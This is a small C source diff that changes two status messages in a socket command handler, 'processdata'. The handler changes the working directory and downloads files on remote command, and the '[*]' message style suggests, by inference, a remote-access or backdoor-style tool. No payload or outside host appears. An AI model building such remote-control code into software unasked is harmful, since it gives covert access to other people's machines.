@@ -221,7 +221,7 @@ int processdata(SOCKET s, char cmd, char cmd2)
 					buf[q+1] = 0;
 					change_dir(buf);
 					memset(buf, 0, BUFSIZE);
-					strcpy(buf, "changed dir\n");
+					strcpy(buf, "[*] changed dir\n");
 				}
 			}
 
@@ -255,7 +255,7 @@ int processdata(SOCKET s, char cmd, char cmd2)
 				} else {
 					download(buf);
 					memset(buf, 0, BUFSIZE);
-					strcpy(buf, "file downloaded\n");
+					strcpy(buf, "[*] file downloaded\n");
 				}
 			}
 		} else {
